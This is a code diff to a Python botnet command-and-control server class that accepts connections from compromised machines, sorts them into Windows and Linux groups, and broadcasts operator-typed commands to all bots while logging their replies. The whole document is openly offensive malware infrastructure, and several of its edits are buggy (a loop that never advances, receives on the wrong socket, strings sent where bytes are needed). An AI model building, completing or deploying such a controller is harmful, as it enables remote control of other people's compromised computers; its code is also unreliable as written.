@@ -51,18 +51,19 @@ class BotnetCmdCtrl:
 		"""
 		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
 			sock.bind((IP, PORT)) # Bind the IP and port to a network interface card.
-			sock.listen(10) # Listen for incoming connections, default is 10, increase for more connections.
+			sock.listen() # Listen for incoming connections, default is 10, increase for more connections.
 			conn, addr = sock.accept() # Accept incoming connections, store connection socket and client IP, Port
-			response = sock.recv(1024).decode('utf-8') # Decode initial response from connection as utf-8
+			print(addr[0])
+			response = conn.recv(1024).decode('utf-8') # Decode initial response from connection as utf-8
+			while response:
+				if "Windows" in response: # Check if operating system of target is Windows.
+					self.windows_count += 1 # Increment number of Windows machine counter.
+					self.windows_connections[addr[1]] = conn # Create key, value pair of target IP and connection socket.
+				else: 
+					self.linux_count += 1 # Increment number of Linux machine counter.
+					self.linux_connections[addr[1]] = conn # Create key, value pair of target IP and connection socket.
 
-			if "Windows" in response: # Check if operating system of target is Windows.
-				self.windows_count += 1 # Increment number of Windows machine counter.
-				self.windows_connections[addr[1]] = conn # Create key, value pair of target IP and connection socket.
-			else: 
-				self.linux_count += 1 # Increment number of Linux machine counter.
-				self.linux_connections[addr[1]] = conn # Create key, value pair of target IP and connection socket.
-
-			self.server_socket = sock # Set the instance socket to the connection socket we establisehd with our client.
+					self.server_socket = sock # Set the instance socket to the connection socket we establisehd with our client.
 		
 	def get_command(self):
 		"""This function gets a command from the user.
@@ -71,7 +72,7 @@ class BotnetCmdCtrl:
 			Returns:
 				The command that was provided by the user.
 		"""
-		command = input(GREEN + 'C&C$ ' + RESET) # Prompt user for command to send to entire botnet.
+		command = input(GREEN + 'c&c$ ' + RESET) # Prompt user for command to send to entire botnet.
 		return command # Return command specified.
 	
 	def send_cmd_all_linux(self):
@@ -83,7 +84,7 @@ class BotnetCmdCtrl:
 		"""
 		command = self.get_command()
 		for ip, conn in self.linux_connections.items():
-			conn.send(command)
+			conn.sendall(command)
 			response = self.sock.recv(10000).decode('utf-8') # Store response received from executed command.
 			self.write_response_output(response, ip) # Write response to file.
 			
@@ -96,7 +97,7 @@ class BotnetCmdCtrl:
 		"""
 		command = self.get_command()
 		for ip, conn in self.windows_connections.items():
-			conn.send(command)
+			conn.sendall(command)
 		response = self.sock.recv(10000).decode('utf-8')
 		self.write_response_output(response, ip)
 	
